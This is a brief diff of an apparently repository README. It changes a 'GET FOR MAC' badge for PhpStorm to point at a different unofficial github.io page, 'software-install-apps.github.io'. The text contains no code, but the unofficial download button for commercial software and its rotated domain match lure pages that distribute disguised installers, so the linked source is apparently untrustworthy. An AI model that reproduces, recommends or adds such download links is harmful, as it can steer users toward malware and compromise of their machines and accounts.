@@ -7,7 +7,7 @@
 
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://setup-osx-apps.github.io/.github/phpstorm)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://software-install-apps.github.io/.github/phpstorm)  
 
 </div>  
 
